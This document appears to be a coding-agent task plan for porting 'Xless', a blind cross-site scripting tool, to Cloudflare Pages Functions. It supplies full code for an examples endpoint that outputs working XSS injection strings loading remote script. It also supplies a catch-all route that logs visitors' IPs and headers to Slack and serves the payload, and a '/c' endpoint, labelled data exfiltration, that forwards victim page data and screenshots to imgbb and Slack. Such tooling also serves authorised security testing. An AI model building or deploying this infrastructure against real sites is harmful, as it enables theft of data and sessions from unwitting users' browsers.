# Cloudflare Pages Migration Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Migrate Xless from Vercel/Node.js to Cloudflare Pages Functions and clean up legacy files.

**Architecture:** Use Cloudflare Pages Functions for backend logic and static hosting for `payload.js`. Replace `express`, `request`, and `body-parser` with native Web APIs (`fetch`, `Request`, `Response`).

**Tech Stack:** Cloudflare Pages Functions, Web APIs, Vanilla JavaScript.

---

### Task 1: Project Restructuring

**Files:**
- Create: `public/payload.js`
- Create: `functions/_middleware.js`
- Modify: `package.json`
- Delete: `payload.js`

- [ ] **Step 1: Create `public` directory and move `payload.js`**

```bash
mkdir -p public
mv payload.js public/payload.js
```

- [ ] **Step 2: Create `functions` directory and global CORS middleware**
Cloudflare Pages Functions handle CORS via middleware.

```javascript
// functions/_middleware.js
export async function onRequest(context) {
  const response = await context.next();
  response.headers.set("Access-Control-Allow-Origin", "*");
  response.headers.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  response.headers.set("Access-Control-Allow-Headers", "Content-Type");
  response.headers.set("Powered-By", "XLESS");
  return response;
}
```

- [ ] **Step 3: Update `package.json` to remove unnecessary dependencies**
Remove `express`, `body-parser`, `cors`, `request`, `dotenv`. Keep `wrangler` for local dev if desired, but for now let's just clean it up.

```json
{
  "name": "xless",
  "version": "1.0.0",
  "description": "Xless: The Serverless Blind XSS App.",
  "scripts": {
    "dev": "wrangler pages dev public"
  },
  "devDependencies": {
    "wrangler": "^3.0.0"
  }
}
```

- [ ] **Step 4: Commit restructuring**

```bash
git add public/payload.js functions/_middleware.js package.json
git commit -m "refactor: restructure project for Cloudflare Pages"
```

---

### Task 2: Implement Health and Examples Functions

**Files:**
- Create: `functions/health.js`
- Create: `functions/examples.js`

- [ ] **Step 1: Implement `/health` endpoint**

```javascript
// functions/health.js
export async function onRequest(context) {
  const { env } = context;
  const health_data = {
    IMGBB_API_KEY: !!env.IMGBB_API_KEY,
    SLACK_INCOMING_WEBHOOK: !!env.SLACK_INCOMING_WEBHOOK
  };

  // Test IMGBB if key exists (simplified version of the original health check)
  if (env.IMGBB_API_KEY) {
    const xless_logo_base64 = "iVBORw0KGgoAAAANSUhEUgAAAGkAAABfCAMAAADcfxm4AAAA..."; // Truncated for brevity in plan, use full in implementation
    const formData = new FormData();
    formData.append("image", xless_logo_base64);
    
    try {
      const imgRes = await fetch(`https://api.imgbb.com/1/upload?key=${env.IMGBB_API_KEY}`, {
        method: "POST",
        body: formData
      });
      const imgOut = await imgRes.json();
      health_data.imgbb_response = imgOut.data?.url_viewer || imgOut.error?.message || "Unknown error";
    } catch (e) {
      health_data.imgbb_response = e.message;
    }
  }

  return new Response(JSON.stringify(health_data), {
    headers: { "Content-Type": "application/json" }
  });
}
```

- [ ] **Step 2: Implement `/examples` endpoint**

```javascript
// functions/examples.js
export async function onRequest(context) {
  const url = new URL(context.request.url);
  const baseUrl = `${url.protocol}//${url.host}`;
  
  let page = "";
  page += `\'"><script src="${baseUrl}"></script>\n\n`;
  page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${baseUrl}\\';document.body.appendChild(a)')\n\n`;
  page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${baseUrl}");a.send();</script>\n\n`;
  page += `<script>$.getScript("${baseUrl}")</script>`;

  return new Response(page, {
    headers: { "Content-Type": "text/plain" }
  });
}
```

- [ ] **Step 3: Commit health and examples**

```bash
git add functions/health.js functions/examples.js
git commit -m "feat: add health and examples endpoints"
```

---

### Task 3: Implement OOB Callback Listener (Catch-all)

**Files:**
- Create: `functions/[[path]].js`

- [ ] **Step 1: Implement catch-all route to alert and serve payload**

```javascript
// functions/[[path]].js
export async function onRequest(context) {
  const { request, env, params } = context;
  const url = new URL(request.url);
  
  // Skip if it's a known endpoint handled by other files
  const reserved = ["/c", "/health", "/examples", "/message", "/payload.js"];
  if (reserved.includes(url.pathname)) {
    return context.next();
  }

  // Generate Callback Alert
  const ip = request.headers.get("cf-connecting-ip") || request.headers.get("x-forwarded-for") || "Unknown";
  let alert = "*XSSless: Out-of-Band Callback Alert*\n";
  alert += `• *IP Address:* \`${ip}\`\n`;
  alert += `• *Request URI:* \`${url.pathname}\`\n`;

  for (const [key, value] of request.headers.entries()) {
    alert += `• *${key}:* \`${value}\`\n`;
  }

  // Send to Slack
  if (env.SLACK_INCOMING_WEBHOOK) {
    await fetch(env.SLACK_INCOMING_WEBHOOK, {
      method: "POST",
      body: JSON.stringify({
        username: "XLess",
        text: alert,
        mrkdwn: true
      })
    });
  }

  // Fetch payload.js from static assets and serve it
  const payloadUrl = new URL("/payload.js", request.url);
  const payloadResponse = await fetch(payloadUrl);
  return new Response(await payloadResponse.text(), {
    headers: { "Content-Type": "application/javascript" }
  });
}
```

- [ ] **Step 2: Commit catch-all**

```bash
git add functions/[[path]].js
git commit -m "feat: add catch-all OOB listener and payload server"
```

---

### Task 4: Implement Data Exfiltration Function (/c)

**Files:**
- Create: `functions/c.js`

- [ ] **Step 1: Implement `/c` POST handler**

```javascript
// functions/c.js
export async function onRequestPost(context) {
  const { request, env } = context;
  const data = await request.json();
  const ip = request.headers.get("cf-connecting-ip") || request.headers.get("x-forwarded-for") || "Unknown";
  data["Remote IP"] = ip;

  let screenshotUrl = "";
  if (env.IMGBB_API_KEY && data["Screenshot"]) {
    const encoded = data["Screenshot"].replace("data:image/png;base64,", "");
    const formData = new FormData();
    formData.append("image", encoded);

    try {
      const imgRes = await fetch(`https://api.imgbb.com/1/upload?key=${env.IMGBB_API_KEY}`, {
        method: "POST",
        body: formData
      });
      const imgOut = await imgRes.json();
      screenshotUrl = imgOut.data?.url_viewer || "Error uploading";
    } catch (e) {
      screenshotUrl = "Exception: " + e.message;
    }
  }

  // Generate Alert
  let alert = "*XSSless: Blind XSS Alert*\n";
  for (const [k, v] of Object.entries(data)) {
    if (k === "Screenshot") continue;
    const value = v === "" ? "```None```" : `\n\`\`\`${v}\`\`\``;
    alert += `*${k}:* ${value}\n`;
  }
  if (screenshotUrl) {
    alert += `*Screenshot URL:* \`${screenshotUrl}\`\n`;
  }

  if (env.SLACK_INCOMING_WEBHOOK) {
    await fetch(env.SLACK_INCOMING_WEBHOOK, {
      method: "POST",
      body: JSON.stringify({
        username: "XLess",
        text: alert,
        mrkdwn: true
      })
    });
  }

  return new Response("ok\n");
}
```

- [ ] **Step 2: Commit /c handler**

```bash
git add functions/c.js
git commit -m "feat: add data exfiltration endpoint"
```

---

### Task 5: Implement Message Function (/message)

**Files:**
- Create: `functions/message.js`

- [ ] **Step 1: Implement `/message` handler**

```javascript
// functions/message.js
export async function onRequest(context) {
  const { request, env } = context;
  const url = new URL(request.url);
  let message = url.searchParams.get("text");

  if (request.method === "POST") {
    const body = await request.formData();
    message = message || body.get("text");
  }

  if (!message) return new Response("Missing text\n", { status: 400 });

  const alert = `*XSSless: Message Alert*\n\`\`\`\n${message}\n\`\`\`\n`;

  if (env.SLACK_INCOMING_WEBHOOK) {
    await fetch(env.SLACK_INCOMING_WEBHOOK, {
      method: "POST",
      body: JSON.stringify({
        username: "XLess",
        text: alert,
        mrkdwn: true
      })
    });
  }

  return new Response("ok\n");
}
```

- [ ] **Step 2: Commit /message handler**

```bash
git add functions/message.js
git commit -m "feat: add message endpoint"
```

---

### Task 6: Final Cleanup

**Files:**
- Delete: `index.js`
- Delete: `vercel.json`
- Delete: `deploy.sh`

- [ ] **Step 1: Remove Vercel-specific files and old entry point**

```bash
rm index.js vercel.json deploy.sh
```

- [ ] **Step 2: Verify folder structure**

```bash
ls -R
```
Expected:
public/
  payload.js
functions/
  _middleware.js
  [[path]].js
  c.js
  health.js
  examples.js
  message.js
package.json

- [ ] **Step 3: Final commit**

```bash
git add .
git commit -m "chore: cleanup legacy files"
```
